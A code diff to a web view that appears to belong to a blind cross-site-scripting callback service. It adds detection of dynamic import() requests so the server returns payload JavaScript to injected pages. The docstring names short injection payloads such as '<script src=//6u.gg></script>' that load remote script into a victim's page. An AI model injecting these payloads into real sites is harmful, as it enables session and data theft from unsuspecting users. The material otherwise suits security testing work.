@@ -31,23 +31,31 @@ def smart_root(request):
     """
     Smart root endpoint - serves JS when loaded as script, otherwise redirects to dashboard
     This enables shortest payload: <script src=//6u.gg></script>
+    Also handles import('//6u.gg') which sets Sec-Fetch-Dest: empty
     """
-    # Check if this is a script request (loaded via <script src>)
+    # Check if this is a script request (loaded via <script src> or import())
     accept_header = request.META.get('HTTP_ACCEPT', '')
     sec_fetch_dest = request.META.get('HTTP_SEC_FETCH_DEST', '')
+    sec_fetch_mode = request.META.get('HTTP_SEC_FETCH_MODE', '')
 
-    # Detect script loading:
-    # 1. Sec-Fetch-Dest: script (modern browsers)
-    # 2. Accept contains */*, no text/html (older browsers)
-    # 3. No Accept header at all (some script requests)
+    # Detect script/module loading:
+    # 1. Sec-Fetch-Dest: script (classic <script src>)
+    # 2. Sec-Fetch-Dest: empty + Sec-Fetch-Mode: cors (dynamic import())
+    # 3. Accept contains */*, no text/html (older browsers)
+    # 4. No Accept header at all (some script requests)
+    # 5. Force via ?js=1 query param
     is_script_request = (
         sec_fetch_dest == 'script' or
+        sec_fetch_dest == 'empty' or  # import() / fetch()
         (accept_header and 'text/html' not in accept_header and '*/*' in accept_header) or
         (not accept_header) or
         request.GET.get('js') == '1'  # Force JS via ?js=1
     )
 
     if is_script_request:
+        # For import(), serve as module
+        if sec_fetch_dest == 'empty' and sec_fetch_mode == 'cors':
+            return serve_module_js(request)
         return serve_payload_js(request)
 
     # Otherwise redirect to dashboard (requires login)
